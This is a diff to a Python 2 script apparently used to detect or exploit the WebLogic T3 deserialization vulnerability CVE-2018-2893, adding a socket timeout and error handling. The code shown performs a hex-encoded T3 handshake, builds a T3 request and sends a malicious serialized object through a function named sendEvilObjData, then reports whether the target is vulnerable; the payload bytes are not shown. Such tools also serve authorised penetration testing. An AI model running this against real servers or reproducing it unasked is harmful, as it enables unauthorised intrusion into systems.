@@ -21,6 +21,7 @@ VER_SIG=['StreamMessageImpl']
 
 def t3handshake(sock,server_addr):
     sock.connect(server_addr)
+    sock.settimeout(6)
     sock.send('74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a'.decode('hex'))
     time.sleep(1)
     data = sock.recv(1024)
@@ -66,16 +67,18 @@ def checkVul(res,server_addr,index):
         print(('[-]目标weblogic未检测到{}'.format(VUL[index])))
 
 def run(dip,dport,index):
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    ##打了补丁之后，会阻塞，所以设置超时时间，默认15s，根据情况自己调整
-    sock.settimeout(10)
-    server_addr = (dip, dport)
-    t3handshake(sock,server_addr)
-    buildT3RequestObject(sock,dport)
-    rs=sendEvilObjData(sock,PAYLOAD[index])
-    #print 'rs',rs
-    checkVul(rs,server_addr,index)
-
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        ##打了补丁之后，会阻塞，所以设置超时时间，默认15s，根据情况自己调整
+        sock.settimeout(10)
+        server_addr = (dip, dport)
+        t3handshake(sock, server_addr)
+        buildT3RequestObject(sock, dport)
+        rs = sendEvilObjData(sock, PAYLOAD[index])
+        # print 'rs',rs
+        checkVul(rs, server_addr, index)
+    except Exception:
+        print("CVE_2018_2893脚本出错")
 if __name__=="__main__":
     # dip = sys.argv[1]
     # dport = int(sys.argv[2])
